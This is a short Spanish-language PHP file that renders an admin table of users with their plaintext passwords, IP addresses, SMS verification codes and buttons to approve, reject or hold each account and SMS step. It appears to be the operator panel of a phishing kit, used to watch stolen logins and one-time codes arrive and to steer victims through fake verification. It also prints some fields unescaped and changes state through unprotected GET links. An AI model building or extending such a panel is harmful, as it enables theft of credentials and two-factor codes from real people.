<?php
include '../db.php'; // Si necesitas subir dos niveles

// Obtener usuarios
$usuarios = $conn->query("SELECT * FROM usuarios ORDER BY id DESC")->fetchAll(PDO::FETCH_ASSOC);
?>

<!-- Devolver solo el HTML de la tabla -->
<tr>
    <th>ID</th>
    <th>Usuario</th>
    <th>Contraseña</th>
    <th>IP</th>
    <th>Status Cuenta</th>
    <th>Status SMS</th>
    <th>Código SMS</th>
    <th>Acciones</th>
</tr>

<?php foreach ($usuarios as $u): ?>
<tr>
    <td><?= $u['id'] ?></td>
    <td><?= htmlspecialchars($u['usuario']) ?></td>
    <td><?= htmlspecialchars($u['contrasena']) ?></td>
    <td><?= $u['ip'] ?></td>
    <td><span class="estado"><?= ucfirst($u['status']) ?></span></td>
    <td><span class="estado"><?= ucfirst($u['sms_status']) ?></span></td>
    <td><?= $u['codigo_sms'] ?: 'Esperando código' ?></td>
    <td>
        <!-- Acciones -->
        <a href="?accion=aprobar&id=<?= $u['id'] ?>&tipo=cuenta"><button class="btn btn-aprobar">Aprobar Cuenta</button></a>
        <a href="?accion=rechazar&id=<?= $u['id'] ?>&tipo=cuenta"><button class="btn btn-rechazar">Rechazar Cuenta</button></a><br><br>
        <a href="?accion=aprobar&id=<?= $u['id'] ?>&tipo=sms"><button class="btn btn-aprobar">Aprobar SMS</button></a>
        <a href="?accion=rechazar&id=<?= $u['id'] ?>&tipo=sms"><button class="btn btn-rechazar">Rechazar SMS</button></a>
        <a href="?accion=pendiente&id=<?= $u['id'] ?>&tipo=sms"><button class="btn btn-pendiente">SMS Pendiente</button></a>
    </td>
</tr>
<?php endforeach; ?>
